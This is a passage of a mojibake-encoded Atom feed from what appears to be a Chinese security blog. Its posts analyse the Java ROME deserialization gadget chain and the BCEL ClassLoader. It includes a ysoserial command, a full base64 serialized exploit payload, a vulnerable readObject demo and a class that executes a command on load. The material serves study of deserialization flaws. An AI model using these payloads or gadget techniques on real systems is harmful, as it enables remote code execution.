    <summary type="html">&lt;p&gt;å¼€å§‹å…ˆæ‰«ä¸€ä¸‹cæ®µå‘ç°é¶æœº&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../images/image-20230430155615236.png&quot; alt=&quot;image-20230430155615236&quot;&gt;&lt;/p&gt;
&lt;p&gt;ç„¶åå¼€å§‹æ‰«ä¸€ä¸‹ç«¯å£&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../</summary>
      
    
    
    
    
    <category term="Vulnhubâ€”â€”DriftingBlues-5" scheme="https://ke1nys.github.io/tags/Vulnhub%E2%80%94%E2%80%94DriftingBlues-5/"/>
    
  </entry>
  
  <entry>
    <title>javaååºåˆ—åŒ–-Rome</title>
    <link href="https://ke1nys.github.io/posts/a91085da.html"/>
    <id>https://ke1nys.github.io/posts/a91085da.html</id>
    <published>2023-04-27T12:59:30.000Z</published>
    <updated>2023-05-03T12:37:29.081Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://goodapple.top/archives/1145">å‚è€ƒæ–‡ç« </a></p><p>ä»é›¶å¼€å§‹åˆ†æ</p><p>ROME æ˜¯ä¸€ä¸ªå¯ä»¥å…¼å®¹å¤šç§æ ¼å¼çš„ feeds è§£æå™¨ï¼Œå¯ä»¥ä»ä¸€ç§æ ¼å¼è½¬æ¢æˆå¦ä¸€ç§æ ¼å¼ï¼Œä¹Ÿå¯è¿”å›æŒ‡å®šæ ¼å¼æˆ– Java å¯¹è±¡ã€‚ROME å…¼å®¹äº† RSS (0.90, 0.91, 0.92, 0.93, 0.94, 1.0, 2.0), Atom 0.3 ä»¥åŠ Atom 1.0 feeds æ ¼å¼ã€‚</p><p>Rome æä¾›äº† <strong>ToStringBean</strong> è¿™ä¸ªç±»ï¼Œæä¾›æ·±å…¥çš„ toString æ–¹æ³•å¯¹JavaBeanè¿›è¡Œæ“ä½œã€‚</p><h2 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h2><p>Idea æ–°å»ºä¸€ä¸ªMavené¡¹ç›®</p><p>è¿™é‡Œç›´æ¥åˆ°mavenåŒ…å°±è¡Œäº†</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.11<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>rome<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>rome<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.javassist<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>javassist<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.28.0-GA<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure><p>æ–°å»ºä¸€ä¸ªdemoæ¥è¿›è¡Œè§¦å‘æ¼æ´</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Poc</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException,ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">base64_exp</span> <span class="operator">=</span> <span class="string">&quot;BASE64_STRING&quot;</span>;</span><br><span class="line">        <span class="type">byte</span>[] exp =  Base64.getDecoder().decode(base64_exp);</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bytes</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(exp);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bytes);</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åˆ©ç”¨<code>ysoserial</code>ç”Ÿæˆå¼¹è®¡ç®—å™¨çš„<code>payload</code>ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial.jar ROME <span class="string">&#x27;calc&#x27;</span>|base64</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAB3CAAAAAIAAAACc3IAKGNvbS5zdW4uc3luZGljYXRpb24uZmVlZC5pbXBsLk9iamVjdEJlYW6CmQfedgSUSgIAA0wADl9jbG9uZWFibGVCZWFudAAtTGNvbS9zdW4vc3luZGljYXRpb24vZmVlZC9pbXBsL0Nsb25lYWJsZUJlYW47TAALX2VxdWFsc0JlYW50ACpMY29tL3N1bi9zeW5kaWNhdGlvbi9mZWVkL2ltcGwvRXF1YWxzQmVhbjtMAA1fdG9TdHJpbmdCZWFudAAsTGNvbS9zdW4vc3luZGljYXRpb24vZmVlZC9pbXBsL1RvU3RyaW5nQmVhbjt4cHNyACtjb20uc3VuLnN5bmRpY2F0aW9uLmZlZWQuaW1wbC5DbG9uZWFibGVCZWFu3WG7xTNPa3cCAAJMABFfaWdub3JlUHJvcGVydGllc3QAD0xqYXZhL3V0aWwvU2V0O0wABF9vYmp0ABJMamF2YS9sYW5nL09iamVjdDt4cHNyAB5qYXZhLnV0aWwuQ29sbGVjdGlvbnMkRW1wdHlTZXQV9XIdtAPLKAIAAHhwc3EAfgACc3EAfgAHcQB+AAxzcgA6Y29tLnN1bi5vcmcuYXBhY2hlLnhhbGFuLmludGVybmFsLnhzbHRjLnRyYXguVGVtcGxhdGVzSW1wbAlXT8FurKszAwAGSQANX2luZGVudE51bWJlckkADl90cmFuc2xldEluZGV4WwAKX2J5dGVjb2Rlc3QAA1tbQlsABl9jbGFzc3QAEltMamF2YS9sYW5nL0NsYXNzO0wABV9uYW1ldAASTGphdmEvbGFuZy9TdHJpbmc7TAARX291dHB1dFByb3BlcnRpZXN0ABZMamF2YS91dGlsL1Byb3BlcnRpZXM7eHAAAAAA/////3VyAANbW0JL/RkVZ2fbNwIAAHhwAAAAAnVyAAJbQqzzF/gGCFTgAgAAeHAAAAaeyv66vgAAADIAOQoAAwAiBwA3BwAlBwAmAQAQc2VyaWFsVmVyc2lvblVJRAEAAUoBAA1Db25zdGFudFZhbHVlBa0gk/OR3e8+AQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBABNTdHViVHJhbnNsZXRQYXlsb2FkAQAMSW5uZXJDbGFzc2VzAQA1THlzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMkU3R1YlRyYW5zbGV0UGF5bG9hZDsBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKRXhjZXB0aW9ucwcAJwEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKU291cmNlRmlsZQEADEdhZGdldHMuamF2YQwACgALBwAoAQAzeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRTdHViVHJhbnNsZXRQYXlsb2FkAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAFGphdmEvaW8vU2VyaWFsaXphYmxlAQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAfeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cwEACDxjbGluaXQ+AQARamF2YS9sYW5nL1J1bnRpbWUHACoBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7DAAsAC0KACsALgEABGNhbGMIADABAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7DAAyADMKACsANAEADVN0YWNrTWFwVGFibGUBACB5c29zZXJpYWwvUHduZXIxNjM4NzExMzMzOTc4NzU0MQEAIkx5c29zZXJpYWwvUHduZXIxNjM4NzExMzMzOTc4NzU0MTsAIQACAAMAAQAEAAEAGgAFAAYAAQAHAAAAAgAIAAQAAQAKAAsAAQAMAAAALwABAAEAAAAFKrcAAbEAAAACAA0AAAAGAAEAAAAvAA4AAAAMAAEAAAAFAA8AOAAAAAEAEwAUAAIADAAAAD8AAAADAAAAAbEAAAACAA0AAAAGAAEAAAA0AA4AAAAgAAMAAAABAA8AOAAAAAAAAQAVABYAAQAAAAEAFwAYAAIAGQAAAAQAAQAaAAEAEwAbAAIADAAAAEkAAAAEAAAAAbEAAAACAA0AAAAGAAEAAAA4AA4AAAAqAAQAAAABAA8AOAAAAAAAAQAVABYAAQAAAAEAHAAdAAIAAAABAB4AHwADABkAAAAEAAEAGgAIACkACwABAAwAAAAkAAMAAgAAAA+nAAMBTLgALxIxtgA1V7EAAAABADYAAAADAAEDAAIAIAAAAAIAIQARAAAACgABAAIAIwAQAAl1cQB+ABcAAAHUyv66vgAAADIAGwoAAwAVBwAXBwAYBwAZAQAQc2VyaWFsVmVyc2lvblVJRAEAAUoBAA1Db25zdGFudFZhbHVlBXHmae48bUcYAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAANGb28BAAxJbm5lckNsYXNzZXMBACVMeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRGb287AQAKU291cmNlRmlsZQEADEdhZGdldHMuamF2YQwACgALBwAaAQAjeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRGb28BABBqYXZhL2xhbmcvT2JqZWN0AQAUamF2YS9pby9TZXJpYWxpemFibGUBAB95c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzACEAAgADAAEABAABABoABQAGAAEABwAAAAIACAABAAEACgALAAEADAAAAC8AAQABAAAABSq3AAGxAAAAAgANAAAABgABAAAAPAAOAAAADAABAAAABQAPABIAAAACABMAAAACABQAEQAAAAoAAQACABYAEAAJcHQABFB3bnJwdwEAeHNyAChjb20uc3VuLnN5bmRpY2F0aW9uLmZlZWQuaW1wbC5FcXVhbHNCZWFu9YoYu+X2GBECAAJMAApfYmVhbkNsYXNzdAARTGphdmEvbGFuZy9DbGFzcztMAARfb2JqcQB+AAl4cHZyAB1qYXZheC54bWwudHJhbnNmb3JtLlRlbXBsYXRlcwAAAAAAAAAAAAAAeHBxAH4AFHNyACpjb20uc3VuLnN5bmRpY2F0aW9uLmZlZWQuaW1wbC5Ub1N0cmluZ0JlYW4J9Y5KDyPuMQIAAkwACl9iZWFuQ2xhc3NxAH4AHEwABF9vYmpxAH4ACXhwcQB+AB9xAH4AFHNxAH4AG3ZxAH4AAnEAfgANc3EAfgAgcQB+ACNxAH4ADXEAfgAGcQB+AAZxAH4ABng=</span><br></pre></td></tr></table></figure><p>ç„¶åæ”¾å…¥Poc.javaé‡Œçš„string    ç„¶åè¿›è¡Œè¿è¡Œå°±å¯ä»¥å¼¹å‡ºè®¡ç®—å™¨äº†</p><p><img src="../images/image-20230427213256355.png" alt="image-20230427213256355"></p><p>ç°åœ¨å¯ä»¥å¯¹è¿™æ¡é“¾å­è¿›è¡Œåˆ†æ</p><h3 id="åˆ©ç”¨é“¾åˆ†æ"><a href="#åˆ©ç”¨é“¾åˆ†æ" class="headerlink" title="åˆ©ç”¨é“¾åˆ†æ"></a>åˆ©ç”¨é“¾åˆ†æ</h3><p>è€æ ·å­æˆ‘ä»¬å…ˆå»<code>ysoserial</code>ä¸­çœ‹ä¸€ä¸‹è°ƒç”¨é“¾çš„é¡ºåº</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">* TemplatesImpl.getOutputProperties()</span><br><span class="line">* NativeMethodAccessorImpl.invoke0(Method, Object, Object[])</span><br><span class="line">* NativeMethodAccessorImpl.invoke(Object, Object[])</span><br><span class="line">* DelegatingMethodAccessorImpl.invoke(Object, Object[])</span><br><span class="line">* Method.invoke(Object, Object...)</span><br><span class="line">* ToStringBean.toString(String)</span><br><span class="line">* ToStringBean.toString()</span><br><span class="line">* ObjectBean.toString()</span><br><span class="line">* EqualsBean.beanHashCode()</span><br><span class="line">* ObjectBean.hashCode()</span><br><span class="line"></span><br><span class="line">* HashMap&lt;K,V&gt;.hash(Object)</span><br><span class="line">* HashMap&lt;K,V&gt;.readObject(ObjectInputStream)</span><br></pre></td></tr></table></figure><p>è€ŒROMEæ¼æ´çš„å…³é”®ä¹‹ä¸€å°±æ˜¯<code>ToStringBean.toString()</code></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://goodapple.top/archives/1145&quot;&gt;å‚è€ƒæ–‡ç« &lt;/a&gt;&lt;/p&gt;
&lt;p&gt;ä»é›¶å¼€å§‹åˆ†æ&lt;/p&gt;
&lt;p&gt;ROME æ˜¯ä¸€ä¸ªå¯ä»¥å…¼å®¹å¤šç§æ ¼å¼çš„ feeds è§£æå™¨ï¼Œå¯ä»¥ä»ä¸€ç§æ ¼å¼è½¬æ¢æˆå¦ä¸€ç§æ ¼å¼ï¼Œä¹Ÿå¯è¿”å›æŒ‡å®šæ ¼å¼æˆ– Java å¯¹è±¡</summary>
      
    
    
    
    
    <category term="javaååºåˆ—åŒ–-Rome" scheme="https://ke1nys.github.io/tags/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Rome/"/>
    
  </entry>
  
  <entry>
    <title>Javaå®‰å…¨ä¹‹BCEL ClassLoader</title>
    <link href="https://ke1nys.github.io/posts/30ead299.html"/>
    <id>https://ke1nys.github.io/posts/30ead299.html</id>
    <published>2023-04-25T12:46:38.000Z</published>
    <updated>2023-04-26T13:05:32.227Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://www.cnblogs.com/CoLo/p/15869871.html#about-bcel">å‚è€ƒæ–‡ç« </a></p><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>BCELå¹³å¸¸åœ¨æµ‹è¯•ååºåˆ—åŒ–çš„æ—¶å€™ä¹Ÿç»å¸¸ä¼šç”¨åˆ°ï¼Œæ¯”å¦‚å»¶æ—¶æµ‹Gadgetä»¥åŠåœ¨æŸäº›åœºæ™¯ä¸‹æ‰§è¡Œå‘½ä»¤ä¸æ˜¯é‚£ä¹ˆé¡ºæ‰‹çš„æƒ…å†µä¸‹é€‰æ‹©BCELå»æ‰“å†…å­˜é©¬ï¼Œå°±åƒFastjsonå’ŒThymeleaf SSTIè¿™ç§ã€‚ä»¥å‰ä¹Ÿåªæ˜¯ç”¨åˆ°è¿™ä¸ªBCELä½†æ˜¯æ²¡æœ‰ä»”ç»†å­¦ä¹ è¿‡ï¼Œä¸‹é¢ç®€å•å­¦ä¹ è®°å½•ä¸‹BCELã€‚</p><h1 id="Javaå®‰å…¨ä¹‹BCEL-ClassLoader"><a href="#Javaå®‰å…¨ä¹‹BCEL-ClassLoader" class="headerlink" title="Javaå®‰å…¨ä¹‹BCEL ClassLoader"></a>Javaå®‰å…¨ä¹‹BCEL ClassLoader</h1><p>ç›®å½•</p><ul><li>Javaå®‰å…¨ä¹‹BCEL ClassLoader<ul><li><a href="https://www.cnblogs.com/CoLo/p/15869871.html#å†™åœ¨å‰é¢">å†™åœ¨å‰é¢</a></li><li><a href="https://www.cnblogs.com/CoLo/p/15869871.html#about-bcel">About BCEL</a></li><li><a href="https://www.cnblogs.com/CoLo/p/15869871.html#è°ƒè¯•åˆ†æ">è°ƒè¯•åˆ†æ</a></li><li>é£Ÿç”¨å§¿åŠ¿<ul><li><a href="https://www.cnblogs.com/CoLo/p/15869871.html#fuzzååºåˆ—åŒ–gadget">Fuzzååºåˆ—åŒ–Gadget</a></li><li><a href="https://www.cnblogs.com/CoLo/p/15869871.html#fastjson-bcel-payload">Fastjson BCEL Payload</a></li><li><a href="https://www.cnblogs.com/CoLo/p/15869871.html#thymeleaf-ssti-payload">Thymeleaf SSTI Payload</a></li></ul></li></ul></li></ul><h2 id="å†™åœ¨å‰é¢"><a href="#å†™åœ¨å‰é¢" class="headerlink" title="å†™åœ¨å‰é¢#"></a>å†™åœ¨å‰é¢<a href="https://www.cnblogs.com/CoLo/p/15869871.html#å†™åœ¨å‰é¢">#</a></h2><p>BCELå¹³å¸¸åœ¨æµ‹è¯•ååºåˆ—åŒ–çš„æ—¶å€™ä¹Ÿç»å¸¸ä¼šç”¨åˆ°ï¼Œæ¯”å¦‚å»¶æ—¶æµ‹Gadgetä»¥åŠåœ¨æŸäº›åœºæ™¯ä¸‹æ‰§è¡Œå‘½ä»¤ä¸æ˜¯é‚£ä¹ˆé¡ºæ‰‹çš„æƒ…å†µä¸‹é€‰æ‹©BCELå»æ‰“å†…å­˜é©¬ï¼Œå°±åƒFastjsonå’ŒThymeleaf SSTIè¿™ç§ã€‚ä»¥å‰ä¹Ÿåªæ˜¯ç”¨åˆ°è¿™ä¸ªBCELä½†æ˜¯æ²¡æœ‰ä»”ç»†å­¦ä¹ è¿‡ï¼Œä¸‹é¢ç®€å•å­¦ä¹ è®°å½•ä¸‹BCELã€‚</p><h2 id="About-BCEL"><a href="#About-BCEL" class="headerlink" title="About BCEL"></a>About BCEL</h2><p>BCEL Classloaderåœ¨ JDK &lt; 8u251ä¹‹å‰æ˜¯åœ¨rt.jaré‡Œé¢ã€‚<br>åŒæ—¶åœ¨Tomcatä¸­ä¹Ÿä¼šå­˜åœ¨ç›¸å…³çš„ä¾èµ–<br>tomcat7</p><p>org.apache.tomcat.dbcp.dbcp.BasicDataSource</p><p>tomcat8åŠå…¶ä»¥å</p><p>org.apache.tomcat.dbcp.dbcp2.BasicDataSource</p><p>è€Œåœ¨<code>rt.jar!/com/sun/org/apache/bcel/internal/util/</code>åŒ…ä¸‹ï¼Œæœ‰<code>Classloader</code>è¿™ä¹ˆä¸€ä¸ªç±»ï¼Œå¯ä»¥å®ç°åŠ è½½å­—èŠ‚ç å¹¶åˆå§‹åŒ–ä¸€ä¸ªç±»çš„åŠŸèƒ½ï¼Œè¯¥ç±»ä¹Ÿæ˜¯ä¸ªClassloaderï¼ˆç»§æ‰¿äº†åŸç”Ÿçš„Classloaderç±»ï¼‰é‡å†™äº†<code>loadClass()</code>æ–¹æ³•ï¼Œæºç å¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> Class <span class="title function_">loadClass</span><span class="params">(String class_name, <span class="type">boolean</span> resolve)</span></span><br><span class="line">    <span class="keyword">throws</span> ClassNotFoundException</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="type">Class</span> <span class="variable">cl</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* First try: lookup hash table.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">if</span>((cl=(Class)classes.get(class_name)) == <span class="literal">null</span>) &#123;</span><br><span class="line">      <span class="comment">/* Second try: Load system class using system class loader. You better</span></span><br><span class="line"><span class="comment">       * don&#x27;t mess around with them.</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line">      <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i &lt; ignored_packages.length; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span>(class_name.startsWith(ignored_packages[i])) &#123;</span><br><span class="line">          cl = deferTo.loadClass(class_name);</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span>(cl == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="type">JavaClass</span> <span class="variable">clazz</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Third try: Special request?</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">if</span>(class_name.indexOf(<span class="string">&quot;$$BCEL$$&quot;</span>) &gt;= <span class="number">0</span>)</span><br><span class="line">          clazz = createClass(class_name);</span><br><span class="line">        <span class="keyword">else</span> &#123; <span class="comment">// Fourth try: Load classes via repository</span></span><br><span class="line">          <span class="keyword">if</span> ((clazz = repository.loadClass(class_name)) != <span class="literal">null</span>) &#123;</span><br><span class="line">            clazz = modifyClass(clazz);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ClassNotFoundException</span>(class_name);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(clazz != <span class="literal">null</span>) &#123;</span><br><span class="line">          <span class="type">byte</span>[] bytes  = clazz.getBytes();</span><br><span class="line">          cl = defineClass(class_name, bytes, <span class="number">0</span>, bytes.length);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="comment">// Fourth try: Use default class loader</span></span><br><span class="line">          cl = Class.forName(class_name);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span>(resolve)</span><br><span class="line">        resolveClass(cl);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    classes.put(class_name, cl);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> cl;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>é¦–å…ˆä¼šåˆ¤æ–­ç±»åæ˜¯å¦ä»¥$$$BCEL$$$å¼€å¤´ï¼Œä¹‹åè°ƒç”¨<code>createClass()</code>æ–¹æ³•æ‹¿åˆ°ä¸€ä¸ª<code>JavaClass</code>å¯¹è±¡æœ€ç»ˆé€šè¿‡<code>defineClass()</code>åŠ è½½å­—èŠ‚ç è¿˜åŸç±»ã€‚</p><h2 id="è°ƒè¯•åˆ†æ"><a href="#è°ƒè¯•åˆ†æ" class="headerlink" title="è°ƒè¯•åˆ†æ"></a>è°ƒè¯•åˆ†æ</h2><p>å…ˆæ¥çœ‹ä¸‹ç®€å•çš„ä½¿ç”¨ï¼Œåœ¨åŒä¸€åŒ…ä¸‹ï¼Œå‡†å¤‡ä¸€ä¸ªæ¶æ„ç±»</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> MemoryShell.BCEL;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">calc</span> &#123;</span><br><span class="line">    <span class="keyword">static</span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å‡†å¤‡ä¸€ä¸ªBCELçš„demo,è¿è¡Œå³å¯ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span 